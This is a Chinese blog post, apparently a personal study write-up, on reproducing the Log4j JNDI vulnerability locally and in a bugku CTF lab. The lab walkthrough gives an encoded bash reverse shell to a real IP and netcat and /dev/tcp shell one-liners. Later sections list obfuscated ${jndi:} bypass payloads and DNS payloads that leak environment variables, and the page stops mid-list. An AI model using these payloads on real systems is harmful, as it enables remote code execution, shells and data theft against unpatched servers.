@@ -1,0 +1,427 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>【Log4J】JAVA安全--log4j漏洞研究分析 - Brath-Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Brath-Blog"><meta name="msapplication-TileImage" content="https://brath.cloud/me.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Brath-Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="# 【Log4J】JAVA 安全–log4j 漏洞研究分析           前言：这个漏洞很火，但是自己一直没咋研究过 算是抽空跟了下，总结了很多师傅的文章 写这篇文章进行记录下自己的学习过程吧   log4j漏洞复现   本地复现   这个很多人写了 可直接参考这个 https:&amp;#x2F;&amp;#x2F;cloud.tencent.com&amp;#x2F;developer&amp;#x2F;article&amp;#x2F;1917856   import o"><meta property="og:type" content="blog"><meta property="og:title" content="【Log4J】JAVA安全--log4j漏洞研究分析"><meta property="og:url" content="http://example.com/2023/04/27/%E3%80%90Log4J%E3%80%91JAVA%E5%AE%89%E5%85%A8--log4j%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/"><meta property="og:site_name" content="Brath-Blog"><meta property="og:description" content="# 【Log4J】JAVA 安全–log4j 漏洞研究分析           前言：这个漏洞很火，但是自己一直没咋研究过 算是抽空跟了下，总结了很多师傅的文章 写这篇文章进行记录下自己的学习过程吧   log4j漏洞复现   本地复现   这个很多人写了 可直接参考这个 https:&amp;#x2F;&amp;#x2F;cloud.tencent.com&amp;#x2F;developer&amp;#x2F;article&amp;#x2F;1917856   import o"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png"><meta property="og:image" content="https://img-blog.csdnimg.cn/d8ebe78065f64a89bc310583697bb07a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/c80ad1af9e7d41e080646823d703c488.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/d4d877b6969643438f51f2f9019bd2bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/95acb2cb63304dea8d51d75dd29c7414.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/08fd4bd415414dca979f9b7349771ecb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_11,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/6c0a5d8594a745e4abd1c0213d119391.png"><meta property="og:image" content="https://img-blog.csdnimg.cn/76c81b1f01f04623b82176d1a99f74f1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/0fd91a1552324f52a3abf5f82f7668b6.png"><meta property="og:image" content="https://img-blog.csdnimg.cn/a34a810cfebc4625992a4661a949141b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/b88daebcb458429a9eee3e329d0f595c.png"><meta property="og:image" content="https://img-blog.csdnimg.cn/b5df419f4de342d880d643a16afda976.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/444bc67397494e49b4bdd68a7ecf7595.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/e08749697c9b4afa8bf3e14c080d64a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/ae8c7c82b468476a94e481ff0eba637a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/435deaf0004c4ae5b7c83372964c06fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/f44b105478ca4b4ebacd60249c65cf9d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/8e9287f280ce40e89c435dfb54e36a3d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/6fc8cdd5e2034b02ac1cc2ce1791f925.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/3fa499394fd24ae781a710675c8acd81.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/69df0ca22e0b4552813cbd614b9b1583.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/f1dd7030daf84ef7a761550d2ce3145a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/73e3102efdd84a04a0fc2e7369f1b0a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/5799870557bc4082a264da1d296ca530.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/139cf5be2ec844e09f17ae280e7e4b10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/ec08848f5f074a31aa61e45471e4dd5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/9bc5bd97ada242ffa66b06fa365b8414.png"><meta property="og:image" content="https://img-blog.csdnimg.cn/e1e99abe2a6f4999b9ccfd3673400d34.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/8c89829dcec34b189cb9a5d10749bd54.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/f01fb3723b9a4cb9bc3a6cea5543794a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/a4ab0f7f897f435087a5144dc17935ee.png"><meta property="og:image" content="https://img-blog.csdnimg.cn/64cfe705bd6a40d18d0336ccc52591a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/30b0772e37464b88b25acec8ae0592ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/7ff0c11987524e7aac19d9871b600f49.png"><meta property="og:image" content="https://img-blog.csdnimg.cn/5c39a355863243a886a58aaaa13953c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://img-blog.csdnimg.cn/1e9a7a7d7e95488a9a95207bddd85106.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16"><meta property="og:image" content="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png"><meta property="article:published_time" content="2023-04-27T09:20:48.000Z"><meta property="article:modified_time" content="2023-04-27T09:22:32.311Z"><meta property="article:author" content="Brath"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2023/04/27/%E3%80%90Log4J%E3%80%91JAVA%E5%AE%89%E5%85%A8--log4j%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/"},"headline":"【Log4J】JAVA安全--log4j漏洞研究分析","image":["https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png","https://img-blog.csdnimg.cn/6c0a5d8594a745e4abd1c0213d119391.png","https://img-blog.csdnimg.cn/0fd91a1552324f52a3abf5f82f7668b6.png","https://img-blog.csdnimg.cn/b88daebcb458429a9eee3e329d0f595c.png","https://img-blog.csdnimg.cn/9bc5bd97ada242ffa66b06fa365b8414.png","https://img-blog.csdnimg.cn/a4ab0f7f897f435087a5144dc17935ee.png","https://img-blog.csdnimg.cn/7ff0c11987524e7aac19d9871b600f49.png","https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png"],"datePublished":"2023-04-27T09:20:48.000Z","dateModified":"2023-04-27T09:22:32.311Z","author":{"@type":"Person","name":"Brath"},"publisher":{"@type":"Organization","name":"Brath-Blog","logo":{"@type":"ImageObject","url":"https://brath.cloud/me.png"}},"description":"# 【Log4J】JAVA 安全–log4j 漏洞研究分析           前言：这个漏洞很火，但是自己一直没咋研究过 算是抽空跟了下，总结了很多师傅的文章 写这篇文章进行记录下自己的学习过程吧   log4j漏洞复现   本地复现   这个很多人写了 可直接参考这个 https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1917856   import o"}</script><link rel="canonical" href="http://example.com/2023/04/27/%E3%80%90Log4J%E3%80%91JAVA%E5%AE%89%E5%85%A8--log4j%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/"><link rel="icon" href="https://brath.cloud/me.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="https://brath.cloud/me.png" alt="Brath-Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">主页</a><a class="navbar-item" href="/archives">文章列表</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">更多</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/Guoqing815"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-27T09:20:48.000Z" title="2023/4/27 17:20:48">2023-04-27</time>发表</span><span class="level-item"><time dateTime="2023-04-27T09:22:32.311Z" title="2023/4/27 17:22:32">2023-04-27</time>更新</span><span class="level-item">24 分钟读完 (大约3637个字)</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">【Log4J】JAVA安全--log4j漏洞研究分析</h1><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
+<h2 id="log4jjava安全log4j漏洞研究分析"><a class="markdownIt-Anchor" href="#log4jjava安全log4j漏洞研究分析">#</a> 【Log4J】JAVA 安全–log4j 漏洞研究分析</h2>
+<div id="content_views" class="markdown_views prism-atom-one-light"> 
+ <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path> 
+ </svg> 
+ <p>前言：这个漏洞很火，但是自己一直没咋研究过 算是抽空跟了下，总结了很多师傅的文章 写这篇文章进行记录下自己的学习过程吧</p> 
+ <h1><a id="log4j_1"></a>log4j漏洞复现</h1> 
+ <h2><a id="_2"></a><mark>本地复现</mark></h2> 
+ <p>这个很多人写了 可直接参考这个<br> https://cloud.tencent.com/developer/article/1917856</p> 
+ <pre><code class="prism language-bash"><span class="token function">import</span> org.apache.logging.log4j.Logger<span class="token punctuation">;</span>
+<span class="token function">import</span> org.apache.logging.log4j.LogManager<span class="token punctuation">;</span>
+<p>public class log4jRCE <span class="token punctuation">&#123;<!-- --></span><br>
+private static final Logger logger <span class="token operator">=</span> LogManager.getLogger<span class="token punctuation">(</span>log4jRCE.class<span class="token punctuation">)</span><span class="token punctuation">;</span><br>
+public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span><br>
+logger.error<span class="token punctuation">(</span><span class="token string">&quot;<span class="token variable">$&#123;jndi:ldap:// 服务器的地址 / TomcatBypass/Command/Base64/Y2FsYw==&#125;</span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>
+<span class="token punctuation">&#125;</span><br>
+<span class="token punctuation">&#125;</span></p>
+<p></code></pre></p>
+ <p>这篇文章里面还缺了一点东西<br> 就是idea生成jar文件的方法<br> 这里一起写出来<br> ①打开模块设置<br> <img src="https://img-blog.csdnimg.cn/d8ebe78065f64a89bc310583697bb07a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> ②选模块<br> <img src="https://img-blog.csdnimg.cn/c80ad1af9e7d41e080646823d703c488.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
+ <p>③选好主类以及生成的文件在哪些地方<br> <img src="https://img-blog.csdnimg.cn/d4d877b6969643438f51f2f9019bd2bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> ④选择包含在项目构建中然后点击应用<br> <img src="https://img-blog.csdnimg.cn/95acb2cb63304dea8d51d75dd29c7414.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 编译生成即可<br> <img src="https://img-blog.csdnimg.cn/08fd4bd415414dca979f9b7349771ecb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_11,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 但是对于这个我是失败了的 不知道啥原因<img src="https://img-blog.csdnimg.cn/6c0a5d8594a745e4abd1c0213d119391.png" alt="在这里插入图片描述"></p> 
+ <p>本地编写jar方法</p> 
+ <pre><code class="prism language-bash">①把java编写为class文件
+javac  Exploit.java
+②把class编写为jar文件
+java -jar Exploit.jar Exploit.class
+</code></pre> 
+ <h2><a id="_44"></a><mark>在线靶场复现</mark></h2> 
+ <p>这里以bugku上的靶场为例进行复现<br> https://ctf.bugku.com/challenges/detail/id/340.html<br> <img src="https://img-blog.csdnimg.cn/76c81b1f01f04623b82176d1a99f74f1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 环境配置<br> ①ldap服务<br> <img src="https://img-blog.csdnimg.cn/0fd91a1552324f52a3abf5f82f7668b6.png" alt="在这里插入图片描述"></p> 
+ <p>服务器起一个ldap服务就好了<br> java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 服务器的地址<br> <img src="https://img-blog.csdnimg.cn/a34a810cfebc4625992a4661a949141b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 直接执行反弹shell<br> 即直接配置bash反弹shell命令</p> 
+ <pre><code class="prism language-bash">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMjI2LjY3Lzk5OTkgMD4mMQ&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> -A <span class="token string">"192.168.72.1"</span>
+</code></pre> 
+ <p>②nc配置（windows的话）<br> 起到获取flag的思路<br> https://eternallybored.org/misc/netcat/<br> 下载好后进行监听即可<br> nc -lvnp 端口<br> <img src="https://img-blog.csdnimg.cn/b88daebcb458429a9eee3e329d0f595c.png" alt="在这里插入图片描述"></p> 
+ <p>思路1<br> 不反弹shell进行获取flag</p> 
+ <pre><code class="prism language-bash">user<span class="token operator">=</span><span class="token variable">$&#123;jndi:ldap://服务器的ip:1389/TomcatBypass/TomcatEcho&#125;</span><span class="token operator">&amp;</span>pwd<span class="token operator">=</span>69be4a983341add38e2ad1e5c804568a
+</code></pre> 
+ <p><img src="https://img-blog.csdnimg.cn/b5df419f4de342d880d643a16afda976.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/444bc67397494e49b4bdd68a7ecf7595.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 思路2<br> 进行反弹shell获取</p> 
+ <pre><code class="prism language-bash">常见反弹shell的思路
+①nc ip 12345 -e /bin/sh
+<p>②bash -i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> /dev/tcp/ 启动 nc 服务器的 ip/9999 0<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1<br>
+<span class="token comment">#然后先 base64 编码然后对编码后的特殊字符进行 2 层 url 转码</span></p>
+<p>这台要用第一个命令，题目限定了<br>
+ payload<span class="token operator">=</span><span class="token variable">$&#123;jndi:ldap:1 / 服务器 ip:1389/basic/Command/Base64 / 二层转码之后的字符&#125;</span></p>
+<p></code></pre></p>
+ <p>反弹shell后执行即可</p> 
+ <p><img src="https://img-blog.csdnimg.cn/e08749697c9b4afa8bf3e14c080d64a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/ae8c7c82b468476a94e481ff0eba637a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/435deaf0004c4ae5b7c83372964c06fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
+ <h1><a id="_103"></a><mark>知识点分析</mark></h1> 
+ <p>受影响版本<br> Apache log4j 2.0-beta9 ≤ 2.14.1<br> 组件<br> org.apache.logging.log4j，且版本号小于2.15.0-rc2</p> 
+ <p>ldap基础知识以及服务原因</p> 
+ <h2><a id="payload_111"></a><mark>payload总结</mark></h2> 
+ <p>参考知识点：来源团队的雪晴师傅的<br> https://www.yuque.com/yq1ng/java/pbica2#xrVeI<br> 基础payload<br> ${jndi:ldap://t00ls.com/poc<br> 绕过的一些payload</p> 
+ <pre><code class="prism language-bash"><span class="token variable">$&#123;jndi:ldap://domain.com/j&#125;</span>
+<span class="token variable">$&#123;jndi:ldap:/domain.com/a&#125;</span>
+<span class="token variable">$&#123;jndi:dns:/domain.com&#125;</span>
+<span class="token variable">$&#123;jndi:dns://domain.com/j&#125;</span>
+<span class="token variable">$&#123;$&#123;::-j&#125;</span><span class="token variable">$&#123;::-n&#125;</span><span class="token variable">$&#123;::-d&#125;</span><span class="token variable">$&#123;::-i&#125;</span><span class="token keyword">:</span><span class="token variable">$&#123;::-r&#125;</span><span class="token variable">$&#123;::-m&#125;</span><span class="token variable">$&#123;::-i&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;::-j&#125;</span>ndi:rmi://domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:rmi://domainldap.com/j&#125;</span>
+<span class="token variable">$&#123;$&#123;lower:jndi&#125;</span><span class="token keyword">:</span><span class="token variable">$&#123;lower:rmi&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;lower:$&#123;lower:jndi&#125;</span><span class="token punctuation">&#125;</span>:<span class="token variable">$&#123;lower:rmi&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;lower:j&#125;</span><span class="token variable">$&#123;lower:n&#125;</span><span class="token variable">$&#123;lower:d&#125;</span>i:<span class="token variable">$&#123;lower:rmi&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;lower:j&#125;</span><span class="token variable">$&#123;upper:n&#125;</span><span class="token variable">$&#123;lower:d&#125;</span><span class="token variable">$&#123;upper:i&#125;</span><span class="token keyword">:</span><span class="token variable">$&#123;lower:r&#125;</span>m<span class="token variable">$&#123;lower:i&#125;</span><span class="token punctuation">&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:$&#123;lower:l&#125;</span><span class="token variable">$&#123;lower:d&#125;</span>a<span class="token variable">$&#123;lower:p&#125;</span>://domain.com<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;$&#123;env:NaN:-j&#125;</span>ndi<span class="token variable">$&#123;env:NaN:-:&#125;</span><span class="token variable">$&#123;env:NaN:-l&#125;</span>dap<span class="token variable">$&#123;env:NaN:-:&#125;</span>//domain.com/a<span class="token punctuation">&#125;</span>
+jn<span class="token variable">$&#123;env::-&#125;</span>di:
+jn<span class="token variable">$&#123;date:&#125;</span>di$<span class="token punctuation">&#123;<!-- --></span>date:<span class="token string">':'</span><span class="token punctuation">&#125;</span>
+j<span class="token variable">$&#123;k8s:k5:-ND&#125;</span>i<span class="token variable">$&#123;sd:k5:-:&#125;</span>
+j<span class="token variable">$&#123;main:\k5:-Nd&#125;</span>i<span class="token variable">$&#123;spring:k5:-:&#125;</span>
+j<span class="token variable">$&#123;sys:k5:-nD&#125;</span><span class="token variable">$&#123;lower:i$&#123;web:k5:-:&#125;</span><span class="token punctuation">&#125;</span>
+j<span class="token variable">$&#123;::-nD&#125;</span>i<span class="token variable">$&#123;::-:&#125;</span>
+j<span class="token variable">$&#123;EnV:K5:-nD&#125;</span>i:
+j<span class="token variable">$&#123;loWer:Nd&#125;</span>i<span class="token variable">$&#123;uPper::&#125;</span>
+<p></code></pre></p>
+ <p>信息泄露(主要是针对不出网的)</p> 
+ <pre><code class="prism language-bash"><span class="token variable">$&#123;jndi:ldap://$&#123;env:user&#125;</span>.domain.com/exp<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:dns://$&#123;hostName&#125;</span>.domain.com/a<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:dns://$&#123;env:COMPUTERNAME&#125;</span>.domain.com/a<span class="token punctuation">&#125;</span>
+<span class="token variable">$&#123;jndi:dns://$&#123;env:USERDOMAIN&#125;</span>.domain.com/a<span class="token punctuation">&#125;</span>
